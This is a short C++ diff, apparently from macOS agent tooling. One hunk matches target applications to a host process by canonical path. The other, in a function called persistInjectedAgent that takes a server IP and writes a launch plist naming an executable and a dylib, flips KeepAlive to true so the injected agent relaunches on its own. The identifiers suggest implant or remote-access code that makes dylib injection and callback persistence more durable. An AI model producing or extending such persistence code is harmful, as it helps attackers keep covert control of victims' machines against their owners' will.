@@ -202,8 +202,26 @@ void Agent::handleDispatching(Packet&& packet) {
                 }
 #endif
                 std::vector<std::string> records;
+                // Canonicalize host_path to resolve case differences on APFS
+                std::string host_canon;
+                if (!host_path.empty()) {
+                    char* resolved = ::realpath(host_path.c_str(), nullptr);
+                    if (resolved) {
+                        host_canon = resolved;
+                        ::free(resolved);
+                    } else {
+                        host_canon = host_path;
+                    }
+                }
                 for (const auto& t : targets) {
-                    bool is_host = !host_path.empty() && t.executable_path == host_path;
+                    bool is_host = false;
+                    if (!host_canon.empty()) {
+                        char* resolved = ::realpath(t.executable_path.c_str(), nullptr);
+                        if (resolved) {
+                            is_host = host_canon == resolved;
+                            ::free(resolved);
+                        }
+                    }
                     records.push_back(t.path + "|" + t.bundle_id + "|"
                                     + std::to_string(static_cast<int>(t.capability)) + "|"
                                     + (is_host ? "1" : "0"));
@@ -664,7 +682,7 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
     <key>RunAtLoad</key>
     <true/>
     <key>KeepAlive</key>
-    <false/>
+    <true/>
 </dict>
 </plist>
 )", escapeXml(exec_path).c_str(), escapeXml(dylib_path).c_str(),
